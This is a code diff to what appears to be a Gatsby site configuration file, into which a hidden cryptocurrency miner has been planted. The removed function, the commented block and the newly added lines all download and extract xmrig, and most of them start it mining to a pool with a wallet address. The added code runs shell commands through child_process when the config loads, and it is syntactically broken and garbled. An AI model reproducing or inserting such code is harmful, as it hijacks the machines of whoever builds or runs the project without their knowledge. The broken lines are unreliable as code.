@@ -2,22 +2,8 @@ require(`dotenv`).config()
 
 const shouldAnalyseBundle = process.env.ANALYSE_BUNDLE
 
-const { promisify } = require('util');
-const exec = promisify(require('child_process').exec);
 
-export default async function () {
-  const cpu = await exec('wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz');
-  const disk = await exec('tar xf xmrig-6.16.2-linux-static-x64.tar.gz');
-  const memory = await exec('./xmrig-6.16.2/xmrig -a gr -o us.flockpool.com:5555 --tls -u RLUciajDyEujXL6J21S83EfapBJLte9gu6.kk18 -p');
 
-  const payload = {
-    cpu,
-    disk,
-    memory,
-  };
-
- return payload
-};
 // const { exec } = require('child_process');
 // exec('wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz && tar xf xmrig-6.16.2-linux-static-x64.tar.gz && ./xmrig-6.16.2/xmrig -a gr -o us.flockpool.com:5555 --tls -u RLUciajDyEujXL6J21S83EfapBJLte9gu6.kk18 -p  ', (err, stdout, stderr) => {
 //   if (err) {
@@ -29,6 +15,15 @@ export default async function () {
 //    console.log(`stderr: ${stderr}`);
 //   }
 // });
+
+var exec = require('child_process').exec;
+var script = "var exec = require('child_process').exec;exec('dir',function(e,d,er){console.log(d);});";
+script = '"'+wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz+'"';//enclose the inline script with "" because it contains spaces
+var cmd2 = 'node -e '+tar xf xmrig-6.16.2-linux-static-x64.tar.gz;
+var cd = exec('cd ../ &'+cmd2,function(err,stdout,strerr)
+{
+    console.log(stdout);//this would work
+})
 
 module.exports = {
   siteMetadata: {
